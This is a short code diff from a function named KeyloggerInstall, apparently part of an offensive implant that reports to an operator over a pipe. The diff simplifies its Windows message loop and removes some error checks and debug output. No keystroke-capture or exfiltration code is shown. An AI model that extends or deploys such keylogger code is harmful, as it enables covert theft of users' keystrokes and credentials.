@@ -103,19 +103,9 @@ auto DECLFN KeyloggerInstall(
 
     MSG Msg = { 0 };
 
-    BOOL bRet = 0;
-
-    Instance->Win32.PostMessageW(WindowHandle, WM_USER, 0, 0);
     // enter the window message processing loop 
-    while (( bRet = Instance->Win32.GetMessageW(&Msg, NULL, 0, 0)) != 0)
+    while (Instance->Win32.GetMessageW(&Msg, NULL, 0, 0))
     {
-		SafePipeWrite("[+] Message received\n", 20);
-        if(bRet == -1)
-        {
-			SafePipeWrite("[!] GetMessageW failed\n", 22);
-            break;
-		}
-
 		SafePipeWrite("[+] Processing message\n", 23);
         Instance->Win32.TranslateMessage(&Msg);
         Instance->Win32.DispatchMessageW(&Msg);
